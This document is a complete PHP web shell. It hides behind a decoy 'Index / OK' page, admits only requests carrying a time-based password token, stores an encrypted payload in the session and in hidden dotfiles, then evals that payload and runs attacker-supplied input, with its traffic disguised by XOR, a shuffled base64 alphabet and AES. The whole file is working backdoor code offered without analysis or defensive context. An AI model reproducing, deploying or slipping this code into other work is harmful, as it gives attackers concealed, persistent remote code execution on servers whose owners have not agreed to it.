<?php
@error_reporting(0);@set_time_limit(0);
$_p='pass';
$_k=substr(md5('key'),0,16);
$_sk='xa_1a1dc91c';
$_tf=dirname(__FILE__).DIRECTORY_SEPARATOR.'.xa_1a1dc91c';
$_tf2=@sys_get_temp_dir().DIRECTORY_SEPARATOR.'.xa_1a1dc91c';
$_sa='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/';
$_ak=md5($_p.$_k);
$_pn=substr($_ak,0,8);
$_kt=array();$_s=0;
for($_i=0;$_i<32;$_i++)$_s=($_s*31+hexdec($_ak[$_i]))%65536;
for($_i=0;$_i<256;$_i++){$_s=(($_s*1103515245)+12345)%65536;$_kt[]=$_s%256;}
$_ek=function_exists('hash')?substr(hash('sha256',$_p.$_k.'k',true),0,16):pack('H*',md5($_p.$_k.'k'));
$_ca=str_split($_sa);
for($_i=63;$_i>0;$_i--){$_j=hexdec($_ak[$_i%32])%($_i+1);$_t=$_ca[$_i];$_ca[$_i]=$_ca[$_j];$_ca[$_j]=$_t;}
$_ca=implode('',$_ca);
if(!function_exists('_xae')){function _xae($d,$kt,$sa,$ca){$r='';$n=count($kt);for($i=0;$i<strlen($d);$i++)$r.=chr(ord($d[$i])^$kt[$i%$n]);return strtr(base64_encode($r),$sa,$ca);}}
if(!function_exists('_xad')){function _xad($s,$kt,$sa,$ca){$b=base64_decode(strtr($s,$ca,$sa));if($b===false)return '';$r='';$n=count($kt);for($i=0;$i<strlen($b);$i++)$r.=chr(ord($b[$i])^$kt[$i%$n]);return $r;}}
if(!function_exists('_xax')){function _xax($d,$kt){$r='';$n=count($kt);for($i=0;$i<strlen($d);$i++)$r.=chr(ord($d[$i])^$kt[$i%$n]);return $r;}}
if(!function_exists('_xenc')){function _xenc($d,$ek,$kt){if(function_exists('openssl_encrypt')){$iv=openssl_random_pseudo_bytes(16);$ct=@openssl_encrypt($d,'AES-128-CBC',$ek,OPENSSL_RAW_DATA,$iv);if($ct!==false)return chr(1).$iv.$ct;}return chr(0)._xax($d,$kt);}}
if(!function_exists('_xdec')){function _xdec($s,$ek,$kt){if(strlen($s)<2)return '';$v=ord($s[0]);if($v===1){$b=substr($s,1);if(strlen($b)>16&&function_exists('openssl_decrypt')){$iv=substr($b,0,16);$ct=substr($b,16);$r=@openssl_decrypt($ct,'AES-128-CBC',$ek,OPENSSL_RAW_DATA,$iv);if($r!==false)return $r;}return '';}if($v===0)return _xax(substr($s,1),$kt);return _xax($s,$kt);}}
if(!isset($_POST[$_pn])){echo '<!DOCTYPE html><html><head><title>Index</title><!-- xa:6a2a04bc --></head><body><p>OK</p></body></html>';exit;}
$_apn=substr($_ak,8,8);
$_tok=isset($_POST[$_apn])?(string)$_POST[$_apn]:'';
$_ts=(int)floor(time()/30);
if(substr(md5($_p.(string)$_ts),0,8)!==$_tok&&substr(md5($_p.(string)($_ts-1)),0,8)!==$_tok&&substr(md5($_p.(string)($_ts+1)),0,8)!==$_tok){echo '<!DOCTYPE html><html><head><title>Index</title><!-- xa:6a2a04bc --></head><body><p>OK</p></body></html>';exit;}
$_raw=_xad($_POST[$_pn],$_kt,$_sa,$_ca);
if(strlen($_raw)===0)exit;
$_st=null;
@session_start();
if(isset($_SESSION[$_sk]))$_st=$_SESSION[$_sk];
elseif(@file_exists($_tf))$_st=@file_get_contents($_tf);
elseif(@file_exists($_tf2))$_st=@file_get_contents($_tf2);
if($_st===null){
  if(strlen($_raw)>5000){
    $_enc=_xenc($_raw,$_ek,$_kt);
    $_SESSION[$_sk]=$_enc;
    if(!@file_put_contents($_tf,$_enc)){@file_put_contents($_tf2,$_enc);}
  }
}else{
  $_dec=_xdec($_st,$_ek,$_kt);
  if(strlen($_dec)===0)exit;
  @eval('/*'.$_p.'*/'.$_dec.'');
  if(!function_exists('run'))exit;
  echo substr(md5($_p.$_k),0,16);
  echo _xae(@run($_raw),$_kt,$_sa,$_ca);
  echo substr(md5($_p.$_k),16);
}
?>